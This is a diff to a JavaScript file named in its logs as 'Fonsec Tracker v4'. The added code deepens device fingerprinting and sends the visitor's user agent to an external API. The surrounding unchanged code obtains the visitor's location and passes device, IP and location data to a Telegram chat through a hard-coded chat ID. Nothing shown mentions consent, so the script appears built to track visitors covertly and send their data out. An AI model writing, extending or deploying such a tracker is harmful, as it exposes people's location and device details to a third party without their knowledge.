@@ -1102,15 +1102,46 @@ const CHAT_ID   = '8212900917';
     return ip;
   }
 
-  // ── FUNCIÓN PRINCIPAL DE DETECCIÓN ─────────────────────────
-  async function obtenerInfoDispositivo() {
+  // ── DETECCIÓN AVANZADA CON API EXTERNA ─────────────────────
+  async function obtenerInfoDispositivoAvanzado() {
     const ua = navigator.userAgent;
     const uaLower = ua.toLowerCase();
 
-    // Debug: Mostrar userAgent en consola
     console.log('🔍 UserAgent completo:', ua);
-    console.log('🔍 UserAgent (lowercase):', uaLower);
 
+    // Primero intentar con API externa profesional (UserAgentString.com)
+    try {
+      const response = await fetch(`https://useragentstring.com/api/api_get_string.php?u=${encodeURIComponent(ua)}`);
+      const data = await response.json();
+      console.log('📊 Respuesta API externa:', data);
+
+      if (data && data.agent_type) {
+        return {
+          tipoDispositivo: data.agent_type === 'mobile' ? 'Celular' : data.agent_type === 'tablet' ? 'Tablet' : 'Computador',
+          marca: data.os_name || 'No detectado',
+          modelo: data.device_name || 'PC/Laptop',
+          sistemaOperativo: data.os_name || 'No detectado',
+          procesador: data.cpu_architecture || 'No detectado',
+          ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'No disponible',
+          arquitectura: data.cpu_architecture || 'No disponible',
+          resolucion: `${window.screen.width}x${window.screen.height}`,
+          profundidadColor: window.screen.colorDepth + ' bits',
+          navegador: data.browser_name || 'No detectado',
+          ip: 'Obteniendo IP...',
+          userAgent: ua,
+          fuente: 'API externa'
+        };
+      }
+    } catch (error) {
+      console.log('❌ Error API externa, usando detección local:', error);
+    }
+
+    // Fallback a detección local mejorada
+    return await obtenerInfoDispositivoLocal(ua, uaLower);
+  }
+
+  // ── DETECCIÓN LOCAL MEJORADA ─────────────────────────────
+  async function obtenerInfoDispositivoLocal(ua, uaLower) {
     // Detectar tipo de dispositivo
     let tipoDispositivo;
     if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(uaLower)) {
@@ -1216,8 +1247,23 @@ const CHAT_ID   = '8212900917';
       profundidadColor,
       navegador,
       ip,
-      userAgent: ua
+      userAgent: ua,
+      fuente: 'Detección local'
     };
+  }
+
+  // ── FUNCIÓN PRINCIPAL DE DETECCIÓN ─────────────────────────
+  async function obtenerInfoDispositivo() {
+    const ua = navigator.userAgent;
+    const uaLower = ua.toLowerCase();
+
+    // Intentar primero con API externa profesional
+    try {
+      return await obtenerInfoDispositivoAvanzado();
+    } catch (error) {
+      console.log('❌ Error en detección avanzada, usando local:', error);
+      return await obtenerInfoDispositivoLocal(ua, uaLower);
+    }
   }
 
   // ── OBTENER UBICACIÓN ─────────────────────────────────────
@@ -1340,13 +1386,14 @@ const CHAT_ID   = '8212900917';
   // ── INICIAR TRACKER ───────────────────────────────────────
   async function iniciarTracker() {
     try {
-      console.log('🔍 Fonsec Tracker v4: Iniciando detección...');
+      console.log('🔍 Fonsec Tracker v4: Iniciando detección avanzada...');
 
       const info = await obtenerInfoDispositivo();
       const ubicacion = await obtenerUbicacion();
 
       console.log('📊 Información del dispositivo:', info);
       console.log('📍 Información de ubicación:', ubicacion);
+      console.log('📡 Fuente de detección:', info.fuente);
 
       await enviarTelegram(info, ubicacion);
     } catch (error) {
